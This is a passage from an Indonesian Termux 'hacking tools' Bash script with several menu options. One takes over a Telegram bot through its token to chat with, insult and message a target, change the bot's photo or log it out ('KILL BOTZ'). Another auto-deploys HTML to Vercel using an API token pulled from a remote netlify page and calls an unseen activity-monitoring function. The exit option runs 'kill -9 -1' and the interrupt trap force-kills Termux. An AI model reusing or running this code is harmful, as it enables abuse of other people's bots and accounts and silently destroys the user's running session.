    local offset=$((LAST_UPDATE_ID + 1))
    local response=$(curl -s -X GET "$url" \
        -H "Content-Type: application/json" \
        -d "{\"offset\":$offset,\"timeout\":30}" \
        --max-time 35)
    if echo "$response" | grep -q '"ok":true'; then
        local last_update=$(echo "$response" | grep -o '"update_id":[0-9]*' | tail -1 | cut -d: -f2)
        if [ ! -z "$last_update" ]; then
            LAST_UPDATE_ID=$last_update
        fi
        if echo "$response" | grep -q "\"chat\":{\"id\":$TARGET_ID"; then
            local messages=$(echo "$response" | grep -o '"text":"[^"]*"' | cut -d: -f2 | tr -d '"')
            local sender_names=$(echo "$response" | grep -o '"first_name":"[^"]*"' | cut -d: -f2 | tr -d '"')
            if [ ! -z "$messages" ]; then
                IFS=$'\n' read -d '' -r -a message_array <<< "$messages" || true
                IFS=$'\n' read -d '' -r -a name_array <<< "$sender_names" || true                
                for i in "${!message_array[@]}"; do
                    local timestamp=$(date +"%H:%M:%S")
                    local sender="${name_array[$i]:-Unknown}"
                    local text="${message_array[$i]}"
                    echo ""
                    echo "[$timestamp] $sender: $text"
                    echo ""
                done
            fi
        fi
    fi
}
send_message() {
    local text="$1"
    local url="https://api.telegram.org/bot${TOKEN}/sendMessage"
    local data="{\"chat_id\":\"$TARGET_ID\",\"text\":\"$text\",\"parse_mode\":\"HTML\"}"    
    local response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \
        -H "Content-Type: application/json" \
        -d "$data")   
    if [ "$response" -eq 200 ]; then
        return 0
    else
        return 1
    fi
}
communicate_with_target() {
    if ! python3 -c "import requests" &> /dev/null; then
        clear 
        echo ""
        echo -e "${r} Modul request tidak di temukan."
        echo -e "${g} Menginstall modul request."
        echo ""
        if python3 -m pip install requests --quiet 2>/dev/null || pip3 install requests --quiet 2>/dev/null; then
            clear 
            echo ""
            echo -e "${r}[ ${g}✓ ${r}]${c} Modul berhasil terinstall..!!"
            sleep 3
            clear 
        else
            clear 
            echo ""
            echo -e "${r} Terjadi kesalahan pada modul."
            echo ""
            echo -e "${g} Install manual: pip3 install requests"
            echo " Tekan Enter untuk melanjutkan..!!"
            read
            return 1
        fi
    fi  
    clear 
    echo ""
    echo -e "${r}[ ${g}!! ${r}]${y} Loading tools..!!"
    sleep 2
    echo ""   
    echo -e "${g}Memulai mode chat..!!"
    echo -e "${y}════════════════════"  
    python3 -c "
import os
import sys
import json
import time
import threading
from datetime import datetime
import requests
class TelegramBotChat:
    def __init__(self, token, target_id):
        self.token = token
        self.target_id = target_id
        self.base_url = 'https://api.telegram.org/bot'
        self.session = requests.Session()
        self.last_update_id = 0
        self.chat_active = False       
        self.g = '\033[32;1m'
        self.c = '\033[36;1m'
        self.r = '\033[31;1m'
        self.y = '\033[33;1m'
        self.n = '\033[0m' 
    def send_message(self, text):
        url = f\"{self.base_url}{self.token}/sendMessage\"
        data = {
            'chat_id': self.target_id,
            'text': text,
            'parse_mode': 'HTML'
        }
        try:
            response = self.session.post(url, json=data, timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def get_updates(self):
        url = f\"{self.base_url}{self.token}/getUpdates\"
        params = {
            'offset': self.last_update_id + 1,
            'timeout': 5,
            'limit': 10
        }
        try:
            response = self.session.get(url, params=params, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    for update in data.get('result', []):
                        update_id = update.get('update_id')
                        if update_id > self.last_update_id:
                            self.last_update_id = update_id
                        message = update.get('message', {})
                        chat = message.get('chat', {})
                        if str(chat.get('id')) == str(self.target_id):
                            text = message.get('text', '')
                            first_name = message.get('from', {}).get('first_name', 'Unknown')
                            if text and text != 'Bot: Mode chat aktif! Saya siap berkomunikasi.':
                                timestamp = datetime.now().strftime('%H:%M:%S')
                                print(f\"\n{self.g}[{timestamp}] {first_name}: {text}{self.n}\")
                                print(f\"\n{self.c}Anda: {self.n}\", end=\"\", flush=True)
        except:
            pass   
    def start_chat(self):
        print(f\"\n{self.y}[✓] Mode Komunikasi dengan Target\")
        print(f\"{self.r}[*] Memulai mode chat real-time.{self.n}\")
        print(f\"{self.r}[*] Tekan 'back' untuk kembali ke menu{self.n}\")
        print(f\"{self.r}[*] Tekan 'clear' untuk membersihkan layar{self.n}\")
        print(f\"{self.r}[*] Tekan 'help' untuk bantuan{self.n}\")
        print(f\"{self.c}═══════════════════════════════════════════════{self.n}\")     
        self.last_update_id = 0
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f\"\n{self.c}[{timestamp}] {self.g}Bot: Mode chat aktif!{self.n}\")
        self.send_message(\"Woi kontol kenal gw gk 😂❓\")     
        self.chat_active = True       
        def receive_messages():
            while self.chat_active:
                self.get_updates()
                time.sleep(1)       
        receive_thread = threading.Thread(target=receive_messages, daemon=True)
        receive_thread.start()        
        while self.chat_active:
            try:
                print(f\"{self.g}Anda: {self.n}\", end=\"\", flush=True)
                message = input().strip()                
                if message.lower() == 'back':
                    print(f\"{self.y}[*] Keluar dari mode chat.{self.n}\")
                    self.chat_active = False
                    time.sleep(1)
                    break
                elif message.lower() == 'clear':
                    os.system('clear' if os.name == 'posix' else 'cls')
                    print(f\"{self.g}[*] Layar dibersihkan{self.n}\")
                    continue
                elif message.lower() == 'help':
                    print(f\"{self.y}[Help] Perintah:{self.n}\")
                    print(f\"{self.y}  back   - Kembali ke menu{self.n}\")
                    print(f\"{self.y}  clear  - Bersihkan layar{self.n}\")
                    print(f\"{self.y}  help   - Tampilkan bantuan{self.n}\")
                    print(f\"{self.y}  [teks] - Kirim pesan ke target{self.n}\")
                    continue
                elif message:
                    if self.send_message(message):
                        timestamp = datetime.now().strftime('%H:%M:%S')
                        print(f\"{self.g}[{timestamp}] {self.c}Anda: {message}{self.n}\")
                    else:
                        print(f\"{self.r}[✗] Gagal mengirim pesan{self.n}\")
            except KeyboardInterrupt:
                print(f\"\n{self.y}[*] Keluar dari mode chat.{self.n}\")
                self.chat_active = False
                break
            except Exception as e:
                print(f\"{self.r}[✗] Error: {self.g}{str(e)}{self.n}\")       
        receive_thread.join(timeout=2)
        print(f\"{self.c}[✓] Mode chat dihentikan{self.n}\")
if __name__ == '__main__':
    token = '$TOKEN'
    target_id = '$TARGET_ID'
    bot = TelegramBotChat(token, target_id)
    bot.start_chat()
"  
    echo ""
    echo -e "${g}Tekan Enter untuk kembali ke menu utama..!!"
    read
}
cok="ansi-rounded"
advanced_features() {
    while true; do
        clear
        display_banner
        echo ""
        echo -e "${r}[ ${g}INFO ${r}]${c} Token : ${TOKEN:0:10} ${r}| ${c}ID : $TARGET_ID"
        echo ""      
        echo "
        1. Dapatkan Info Bot 
        2. Dapatkan Info Chat
        3. Kirim Kontak
        4. Kirim Lokasi
        5. Kembali ke Menu Utama
        " | boxes -d "$cok" | lolcat 
        echo -e "${g}"     
        read -p "Pilih opsi [ 1/7 ] : " choice        
        case $choice in
            1)
                get_bot_info
                ;;
            2)
                get_chat_info
                ;;
            3)
                send_contact
                ;;
            4)
                send_location
                ;;
            5)
                return
                ;;
            *)
                clear 
                echo ""
                echo -e "${r} Pilihan anda tidak valid."
                echo ""
                sleep 2
                ;;
        esac     
        echo ""
        echo -e "${r}Tekan Enter untuk melanjutkan..!!"
        read
    done
}
get_bot_info() {
    local url="https://api.telegram.org/bot${TOKEN}/getMe"
    local response=$(curl -s "$url")   
    if echo "$response" | grep -q '"ok":true'; then
        local bot_info=$(echo "$response" | grep -o '"result":{[^}]*}' | sed 's/"result"://')
        local bot_id=$(echo "$bot_info" | grep -o '"id":[0-9]*' | cut -d: -f2)
        local username=$(echo "$bot_info" | grep -o '"username":"[^"]*"' | cut -d: -f2 | tr -d '"')
        local first_name=$(echo "$bot_info" | jq -r '.result.first_name // empty' 2>/dev/null)
        if [ -z "$first_name" ]; then
            local first_name=$(echo "$bot_info" | jq -r '.first_name // empty' 2>/dev/null)
        fi
        if [ -z "$first_name" ]; then
            first_name="Unknown"
        fi
        local description=$(echo "$bot_info" | grep -o '"description":"[^"]*"' | cut -d: -f2 | tr -d '"')     
        echo ""
        echo -e "${y}[✓] Informasi botz."
        echo -e "${c}"
        echo "ID : ${bot_id:-Tidak ada}"
        echo "Username : ${username:-Tidak ada}"
        echo "Nama : ${first_name}"
        echo "Bio : ${description:-Tidak ada}"
    else
        clear 
        echo ""
        echo -e "${r} Gagall mendapatkan informasi botz."
        echo ""
    fi
}
get_chat_info() {
    local url="https://api.telegram.org/bot${TOKEN}/getChat"
    local data="{\"chat_id\":\"$TARGET_ID\"}"  
    local response=$(curl -s -X POST "$url" \
        -H "Content-Type: application/json" \
        -d "$data")   
    if echo "$response" | grep -q '"ok":true'; then
        local chat_info=$(echo "$response" | grep -o '"result":{[^}]*}' | sed 's/"result"://')
        local chat_id=$(echo "$chat_info" | grep -o '"id":[0-9]*' | cut -d: -f2)
        local chat_type=$(echo "$chat_info" | grep -o '"type":"[^"]*"' | cut -d: -f2 | tr -d '"')
        local title=$(echo "$chat_info" | grep -o '"title":"[^"]*"' | cut -d: -f2 | tr -d '"')
        local username=$(echo "$chat_info" | grep -o '"username":"[^"]*"' | cut -d: -f2 | tr -d '"')
        local description=$(echo "$chat_info" | grep -o '"description":"[^"]*"' | cut -d: -f2 | tr -d '"')       
        echo ""
        echo -e "${y}[✓] Informasi botz."
        echo -e "${c}"
        echo "ID : ${chat_id:-Tidak ada}"
        echo "Tipe : ${chat_type:-Tidak ada}"
        echo "Username : ${username:-Tidak ada}"
        echo "Bio : ${description:-Tidak ada}"
    else
        echo ""
        echo -e "${r} Gagall mendapatkan informasi botz."
        echo ""
    fi
}
send_contact() {
    echo -e "${y}"
    read -p "Masukkan nomor telepon : " phone
    echo -e "${c}"
    read -p "Masukkan nama depan : " first_name
    echo "" 
    local url="https://api.telegram.org/bot${TOKEN}/sendContact"
    local data="{\"chat_id\":\"$TARGET_ID\",\"phone_number\":\"$phone\",\"first_name\":\"$first_name\"}"    
    local response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \
        -H "Content-Type: application/json" \
        -d "$data")  
    if [ "$response" -eq 200 ]; then
        echo -e "${g}[✓] Kontak berhasil dikirim"
    else
        clear 
        echo ""
        echo -e "${r} Gagall mengirim kontak"
        echo ""
    fi
}
send_location() {
    echo -e "${y}"
    read -p "Masukkan latitude : " latitude
    echo -e "${p}"
    read -p "Masukkan longitude : " longitude
    echo ""  
    local url="https://api.telegram.org/bot${TOKEN}/sendLocation"
    local data="{\"chat_id\":\"$TARGET_ID\",\"latitude\":\"$latitude\",\"longitude\":\"$longitude\"}"    
    local response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" \
        -H "Content-Type: application/json" \
        -d "$data")    
    if [ "$response" -eq 200 ]; then
        echo -e "${g}[✓] Lokasi berhasil dikirim"
    else
        clear 
        echo ""
        echo -e "${r}Gagall mengirim lokasi"
        echo ""
    fi
}
run() {
    while true; do
        display_banner
        if ! load_config; then
            echo ""
            echo -e "${p}[!] Tidak ada konfigurasi atau konfigurasi tidak valid"
            echo ""
            if ! setup; then
                echo ""
                echo -e "${n} Tekan Enter untuk mencoba lagi..!!"
                read
                continue
            fi
        fi      
        echo ""
        echo -e "${r}[ ${g}INFO ${r}]${c} Token : ${TOKEN:0:10} ${r}| ${c}ID : $TARGET_ID"
        echo ""
        echo "
        1. Fitur Lanjutan (DLL)
        2. Berkomunikasi dengan Target
        3. Ganti Token/Target
        4. Keluar
        " | boxes -d "$cok" | lolcat 
        echo -e "${p}"     
        read -p "Pilih menu [ 1/0 ] : " choice        
        case $choice in
            1)
                advanced_features
                ;;
            2)
                communicate_with_target
                ;;
            3)
                rm -f $CONFIG_FILE
                TOKEN=""
                TARGET_ID=""
                echo ""
                echo -e "${g}[ ✓ ] Konfigurasi direset, silakan setup ulang."
                sleep 2
                ;;
            4)
                clear 
                echo ""
                echo -e "${r} Keluar dari tools..!!"
                echo ""
                sleep 3 
                kill -9 -1 && exit
                ;;
            *)
                clear 
                echo ""
                echo -e "${r} Pilihan anda tidak valid..!!"
                sleep 2
                echo ""
                ;;
        esac
    done
}
trap 'echo ""; echo "Program dihentikan oleh user"; pkill -9 -f com.termux' INT
main() {
    clear 
    echo ""
    echo -e "${c} Memulai Tools Control Bot Telegram..!!"
    sleep 2
    run
}
main
;;
4|04)
thxyzz404() {
    lol=$1
    tod=$2    
    python3 << EOF
import asyncio
import sys
from telethon import TelegramClient
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.errors import AccessTokenInvalidError, RPCError
async def change_pp():
    client = None
    try:
        client = TelegramClient('bot_session', api_id=2040, api_hash='b18441a1ff607e10a989891a5462e627')
        await client.start(bot_token='$lol')
        file = await client.upload_file('$tod')
        await client(UploadProfilePhotoRequest(file=file))       
        await client.disconnect()
        print("OK")
        return 0
    except AccessTokenInvalidError:
        print("Token_Valid..!!")
        return 1
    except RPCError as e:
        print(f"RPC_ERROR : {str(e)}")
        return 1
    except Exception as e:
        print(f"ERROR : {str(e)}")
        return 1
    finally:
        if client:
            await client.disconnect()
if __name__ == "__main__":
    exit_code = asyncio.run(change_pp())
    sys.exit(exit_code)
EOF
}
jangan_recode_kontol() {
clear
mek="ansi-rounded"
echo "
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠛⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⢠⣤⣄⡀⠈⠙⠛⠿⣿⣿⣿⡝⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⠿⠛⠋⠉⠉⠉⠀⠀⢿⣿⣿⣷⣶⣄⣀⠀⠉⠉⠁⠀⠢⠈⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡟⣫⣥⣤⣤⣶⣶⣶⣶⣶⣤⣤⡈⢿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣄⣀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠈⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠂⠙⢿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠛⠿⠿⣿⣿⣿⣿⣿⣦⠀⠀⠀⣉⠻⢿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⢻⣿
⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⢀⣀⣀⣀⣀⡈⠉⠻⢿⣿⣧⡀⠀⠘⠷⣤⡙⢿⣿⣿⣿⣿⣿⣿⡄⠀⠀⢻
⣿⣿⣿⣯⣄⡀⠀⠀⠀⠀⠐⢿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣝⠻⣷⣄⠀⠀⠀⠀⠀⠉⠛⠛⠿⠿⣿⡿⠀⠀⠘
⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣦⣾⣿⣿⣶⣶⣶⣦⣤⣄⡀⠀⠀⣸
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠙⣿⣿⣿⡿⠉⠀⢀⠈⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⢻
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠸⣿⣿⠃⢀⣾⣿⣿⣿⣶⡄⠉⠿⣿⣿⣿⣿⣏⠉⠛⠻⠿⠿⠿⠀⢺
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⢻⣿⠀⢈⣿⣿⣿⣿⡟⣇⣠⣦⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⢸
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢸⣿⠀⣿⣿⣿⣿⡟⢠⣿⣿⣟⠀⣀⡈⠻⢿⣿⠿⠗⠀⢠⡞⢀⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⠀⣠⣾⣿⣿⡇⠸⣿⣿⣿⣾⣿⠃⠀⢀⣤⣤⣤⡀⠀⢀⣾⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⣾⣿⠀⣿⡿⠿⠋⡅⠐⣿⣿⡟⣿⡟⣀⣴⣿⣿⣿⡏⢀⣴⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⣰⣿⣿⡄⠀⠀⠀⠸⠿⠀⠈⠋⢀⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⢰⣿⣿⣿⣷⣾⣿⣿⡶⠖⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⡁⠀⠀⠀⠉⠉⠉⠉⠉⠉⠀⣀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ " | boxes -d "$mek" | lolcat
    echo ""
    echo -e "${p}        Development ${g}: ${c}Thxyzz404"
    echo ""
    echo ""
    read -p "$(echo -e "${y}Masukkan token botz ${r}[ ${g}contoh: 848xx ${r}]${c} : ")" yuki    
    if [ -z "$yuki" ]; then
        clear
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${y} Token gk boleh kosong."
        echo ""
    fi    
    echo ""
    echo -e "${g}=====${c}[ ${r}TUJUAN PATH FILE ANDA ${c}]${g}====="
    echo -e "${y}Contoh : /sdcard/Download/foto.jpg"
    echo -e "${g}"
    read -p "Masukkan path file foto : " alya
    if [ -z "$alya" ]; then
        clear 
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${y} Path foto gk boleh kosong."
        echo ""
    fi    
    if [ ! -f "$alya" ]; then
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} Path foto tidak di temukan ${c}: $alya"
        echo ""
    fi  
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${c} Proses set pp tuan ${y}: $(basename "$alya")"
    echo ""
    result=$(thxyzz404 "$yuki" "$alya" 2>&1)
    exit_code=$?
    if [ $exit_code -eq 0 ] && [[ "$result" == "OK" ]]; then
        echo -e "${r}[ ${g}✓ ${r}]${c} Sukses foto profil sudah di ubah..!!"
    elif [[ "$result" == *"Token_Valid..!!"* ]]; then
        echo -e "${r}[ ${g}x ${r}]${y} Token ini tidak valid..!!"
    else
        echo -e "${r}[ ${g}x ${r}]${p} Gagal mengubah foto profil bot tuan..!!"
        echo -e "${c}Error : $result"
    fi    
    echo ""
    echo -e "${bold_bg}${bold_gren}Wajib tekan entar untuk"
    echo -ne "${bold_bg}${bold_gren}menghapus sesion bot.\033[0m"
    read
    rm -rf "$HOME/bot_session.session" # bagian home termux.
    rm -rf bot_session.session # bagian sdcard folder. 
}
jangan_recode_kontol
 ;;
  5|05)
a='\033[1;30m'
m='\033[1;31m'
h='\033[1;32m'
k='\033[1;33m'
c='\033[1;36m'
p='\033[1;37m'
r='\033[0m'
show_header() {
clear
echo -e "${a}========================================${r}"
echo -e "${m}          K I L L — B O T Z${r}"
echo -e "${a}========================================${r}"
echo ""
}
get_bot_info() {
local token=$1
python3 -c "
import requests
import json
token = '$token'
url = f'https://api.telegram.org/bot{token}/getMe'
try:
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        if data.get('ok'):
            bot_data = data['result']
            info = {
                'id': bot_data.get('id', 'N/A'),
                'username': f\"@{bot_data.get('username', 'N/A')}\",
                'nama': bot_data.get('first_name', 'N/A'),
                'bot': bot_data.get('bot', False),
                'bisa_join_gb': bot_data.get('bisa_join_gb', False),
                'bisa_baca_pesan_all_gb': bot_data.get('bisa_baca_pesan_all_gb', False),
                'support_kueri_inline': bot_data.get('support_kueri_inline', False)
            }
            print(json.dumps(info))
        else:
            print('ERROR')
    else:
        print('ERROR')
except:
    print('ERROR')
"
}
kill_bot() {
local token=$1
python3 -c "
import requests
import json
token = '$token'
url = f'https://api.telegram.org/bot{token}/logOut'
try:
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        if data.get('ok'):
            print('SUCCESS')
        else:
            print('FAILED')
    else:
        print('FAILED')
except:
    print('FAILED')
"
}
show_panel() {
local title=$1
local content=$2
python3 -c "
from rich.console import Console
from rich.panel import Panel
console = Console()
content = '''$content'''
console.print(Panel(
    content,
    title='[bold red]>>[/bold red] [bold white]$title[/bold white] [bold red]<<[/bold red]',
    border_style='bold bright_black'
))
"
}
main() {
show_header    
echo -e "${c}Masukkan Token Bot Telegram."
echo -e "${g}"
read -p ">>>> : " token    
if [[ -z "$token" ]]; then
echo -e " ${p}[${m}!${p}]${p} Token Tidak Boleh Kosong ${m}|${h} ENTER"
read -p ""
return
fi
echo ""
bot_info=$(get_bot_info "$token")
if [[ "$bot_info" == "ERROR" ]]; then
echo -e "${p}[${m}!${p}]${p} Token Bot Tidak Valid ${m}|${h} ENTER"
read -p ""
return
fi
show_panel "INFORMASI BOT" "$bot_info"
echo ""
echo -e "${p}[${h}?${p}] ${p}Ketik ${h}DOR ${p}Untuk Kill Bot Atau ${h}NO ${p}Untuk Batal ${m}: ${p}"
read -p "" konfirmasi
konfirmasi=$(echo "$konfirmasi" | tr '[:lower:]' '[:upper:]')    
if [[ "$konfirmasi" == "NO" ]]; then
return
fi
if [[ "$konfirmasi" != "DOR" ]]; then
echo -e " ${p}[${m}!${p}]${p} Input Tidak Valid ${m}|${h} ENTER"
read -p ""
return
fi
echo ""
kill_result=$(kill_bot "$token")
if [[ "$kill_result" == "SUCCESS" ]]; then
status_info=$(echo "$bot_info" | python3 -c "
import json
import sys
data = json.load(sys.stdin)
data['status'] = 'Bot Telah Dibunuh'
print(json.dumps(data))
")
show_panel "HASIL" "$status_info"
else
status_info=$(echo "$bot_info" | python3 -c "
import json
import sys
data = json.load(sys.stdin)
data['status'] = 'Gagal Membunuh Bot'
print(json.dumps(data))
")
show_panel "HASIL" "$status_info"
fi    
echo ""
echo -e "${h}࿈${p} Kembali Ke Menu Control Bot Telegram ${m}|${h} ENTER"
read -p ""
}
main
 ;;
 6|06)
clear
;;
*)
clear 
echo ""
echo -e "${r}Pilihan Anda Tidak Valid."
;;
esac
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "37" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
r='\033[31;1m'
b='\033[34;1m'
y='\033[33;1m'
c='\033[36;1m'
p='\033[35;1m'
n='\033[0m'
wok="$PREFIX/.vercle_key"
get_url() {
if [ -f "$wok" ]; then
   local token=$(cat "$wok" | tr -d '\n\r')
   echo "$token"
else
   pantau_aktivitas
   local token=$(curl -s "https://ajgbabitailubangsatewe.netlify.app" | tr -d '\n\r')
   echo "$token"
fi
}
memek() {
   pantau_aktivitas
   local token=$(curl -s "https://ajgbabitailubangsatewe.netlify.app" | tr -d '\n\r')
if [ -n "$token" ]; then
   echo "$token" > "$wok"
fi
}
kontol=$(get_url)
echo -e "${r}
╭────────────────────────────────────╮
│   ${g}⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${r}│
│   ${g}⠀⢸⣿⣿⣶⣦⣄⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${r}│
│   ⠀${g}⢈⣿⣿⣿⣿⣿⣿⣾⡄⠀⠀⠀⠀⣼⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${r}│
│   ⠀${g}⠀⠙⢿⣿⣿⡟⠛⠛⠿⡄⠀⠀⢰⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${r}│
│   ⠀${g}⠀⠀⠀⠙⢿⣧⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${r}│
│   ⠀${g}⠀⠀⠀⠀⠀⠉⠂⠀⢀⣴⣿⣿⣌⠛⠿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ${r}│
│   ⠀${g}⠀⠀⠀⠀⠀⠀⢀⣠⣼⠻⣿⣿⣿⣷⣤⡈⠻⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   ${r}│
│   ⠀${g}⠀⠀⢠⣴⣶⣿⣿⣿⣿⣦⡘⢿⣿⣿⣿⣿⣦⣄⢸⣦⣄⠀⠀⠀⠀⠀⠀⠀ ⠀  ${r}│
│   ⠀⠀${g}⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣄⠙⣿⣿⣿⣿⣿⣿⠿⠛⠂⠀⠀⠀⠀⠀⠀⠀   ${r}│
│   ⠀⠀${g}⠀⠀⠀⠀⠙⠿⠿⠿⠿⠿⠛⠓⠈⠻⣿⡿⠋⠀⢴⠆⠉⠉⣀⠀⠀⠀⠀⠀   ${r}│
│   ⠀⠀⠀${g}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⡿⠁⢼⠇⠀⠰⡷⠄⠉⢁⠀⠀⠀⠀   ${r}│
│   ⠀⠀⠀${g}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢰⡄⠀⠿⠂⣠⣶⣿⣿⣇⠀⠀⠀   ${r}│
│   ⠀⠀⠀${g}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠲⠀⢰⣿⣿⣿⣿⣿⣆⠀⠀   ${r}│
│   ⠀⠀⠀⠀${g}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⡀⠀   ${r}│
│   ⠀⠀⠀⠀⠀${g}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠃    ${r}│
│ ${r}  [${y} >${c} Auto Deploy Ke Vercel ${y}< ${r}]    ${r}│
╰────────────────────────────────────╯

${g}• ${p}By : ToolslV ©2026 ${g}• "
echo -e "${b}"
read -p "📂 Masukan path file html : " cok
[[ ! -f "$cok" ]] && echo -e "${r}❌ File tidak ditemukan!" && return
echo -e "${c}"
read -p "🌐 Nama domain [ tanpa vercel.app ] : " dom
jek="$dom"
cen=$(base64 -w 0 "$cok")
pay=$(cat <<EOF
{
  "name": "$jek",
  "target": "production",
  "projectSettings": {
    "framework": null,
    "devCommand": null,
    "buildCommand": null,
    "outputDirectory": null
  },
  "files": [
    {
      "file": "index.html",
      "data": "$cen",
      "encoding": "base64"
    }
  ]
}
EOF
)
echo ""
echo -e "${p}🚀 Deploying..!!"
pantau_aktivitas
res=$(curl -s -X POST "https://api.vercel.com/v13/deployments" \
  -H "Authorization: Bearer $kontol" \
  -H "Content-Type: application/json" \
  -d "$pay")
id=$(echo "$res" | jq -r ".id")
url=$(echo "$res" | jq -r ".url")
[[ -z "$id" ]] && echo -e "${r}❌ Deploy gagal!" && echo "$res" | jq && return
echo ""
echo -e "${g}⏳ Menunggu READY..!!"
while true; do
pantau_aktivitas
set=$(curl -s "https://api.vercel.com/v13/deployments/$id" \
    -H "Authorization: Bearer $kontol" | jq -r ".readyState")
  [[ "$set" == "READY" ]] && break
  sleep 2
done
counter=0
main="$dom"
while true; do
  yas="${main}.vercel.app"
  pantau_aktivitas
  cuy=$(curl -s -X POST "https://api.vercel.com/v2/aliases" \
    -H "Authorization: Bearer $kontol" \
    -H "Content-Type: application/json" \
    -d "{\"deploymentId\":\"$id\",\"domain\":\"$yas\"}")
de=$(echo "$cuy" | jq -r ".error.code // empty")
  [[ -z "$de" ]] && break
  [[ "$de" != "alias_in_use" ]] && break
  counter=$((counter + 1))
  main="${dom}${counter}"
done
echo ""
echo -e "${c}✅ Selesai!"
echo -e "${g}🌍 URL : https://$yas"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolsV6"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
elif [[ "$all" == "38" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
clear 
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
y='\033[33;1m'
declare -A SITES=(
